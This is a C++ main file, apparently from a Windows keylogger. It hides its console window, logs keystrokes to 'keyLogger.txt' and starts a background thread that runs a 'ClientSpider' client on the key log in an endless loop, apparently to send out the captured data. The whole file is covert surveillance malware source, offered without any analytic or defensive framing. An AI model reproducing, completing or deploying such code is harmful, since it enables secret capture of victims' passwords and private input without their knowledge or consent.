#include "stdafx.h"
#include "Logs.h"
#include "ClientSpider.h"
#include <fstream>

void hideConsole()
{
	HWND Stealth;
	AllocConsole();
	Stealth = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(Stealth, 0);
}

DWORD WINAPI client(LPVOID lpParameter)
{
	std::string		keyFileName;

	keyFileName = *static_cast<std::string *>(lpParameter);
	delete lpParameter;

	ClientSpider	client(keyFileName);

	while (42)
	{
		client.Launch();
		client.Loop();
	}
}

int _tmain(int argc, _TCHAR* argv[])
{
	Logs			logs(std::string("keyLogger.txt"));

	hideConsole();
	CreateThread(NULL, 0, client, new std::string(logs.getKeyFileName()), 0, 0);
	logs.waitForInput();
	return 0;
}
